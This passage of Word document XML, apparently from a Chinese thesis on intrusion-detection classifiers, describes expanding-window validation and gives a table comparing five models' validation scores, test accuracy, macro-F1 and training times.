        <w:t>第二次改成类内按时间划分（每类最早的 70% 训练、接下来 20% 验证、最后 10% 测试）。这一版暴露了另一个问题：用单段验证集选型等于抛硬币。random_forest 与 xgboost 在验证集上完全并列（0.9975 对 0.9975），在最后 10% 上却差 0.0243；按验证集选会选中 random_forest，而测试集说的是 xgboost。单段验证集紧贴训练段的尾部，同一段流量里的近似重复还在，它测不出“再往后滑一段会不会失手”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E046D83">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第三次用前向滚动验证（expanding window）：把前 90% 的开发段按类内时间再切 3 块，第 k 折用前 k 块训练、第 k+1 块验证，最后 10% 全程封存、只在最后报一次。这是本项目最终采用的口径（训练 206 163 行、封存测试 22 907 行）。另外，考虑到 Heartbleed 测试集只有 1 个样本，判对判错直接摆动六分之一的总分，选型改用剔除样本数少于 30 的类之后的 macro-F1（记作 reliable macro-F1）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5E3CE7">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.4 五模型同口径对比结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216F9C96">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-6　五模型同口径对比（训练 206 163 行、封存测试 22 907 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2494"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="1587"/>
        <w:gridCol w:w="1020"/>
        <w:gridCol w:w="1134"/>
      </w:tblGrid>
      <w:tr w14:paraId="6372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shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="209AC3E4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>模型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2494" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5D6D829D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>滚动验证均值（3 折）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="55B992D8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>标准差</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6A81F738">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>最后 10% 准确率</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6FE217CE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>reliable macro-F1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="446F6A8A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>树数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="63CEDBE7">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>训练耗时</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="4F02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4B9467D5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>决策树</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2494" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="745459B2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="51EF9A41">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.0234</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="26B707D5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9714</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="47FE0162">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9674</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15E7156B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="329233DF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>3.38 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="264E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7C91F005">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>随机森林</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2494" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="423DB54A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9806</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="58334749">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.0255</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3D7BF663">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9590</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="05D20844">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9562</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="13CEC140">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>100</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="34108A1D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>4.43 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="1E50E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701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3A91DF79">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>XGBoost</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2494" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5916F5BB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9817</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3D28D2CD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.0249</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="21C997FC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9715</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6063D2A6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9719</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4C8231D2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>1 800</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="62603F8C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>12.69 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="617B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34F15176">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>逻辑回归</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2494" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="756C479C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9419</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="665F6390">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.0250</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3DD9898D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9739</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5D8B0D93">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9646</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15D8888B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="03EE1D1C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>18.07 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="33338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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="59E37EA0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>混合森林</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2494" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="49DD0CD4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9770</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4659DD3A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.0241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="683E5CE0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9452</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5AC8160C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>0.9362</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="108677BD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>10 400</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1E72F952">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>652.30 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="03C77A1F">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B490D2D">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="1812290"/>
            <wp:effectExtent l="0" t="0" r="14605"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72000" cy="1812758"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9AA286">
      <w:pPr>
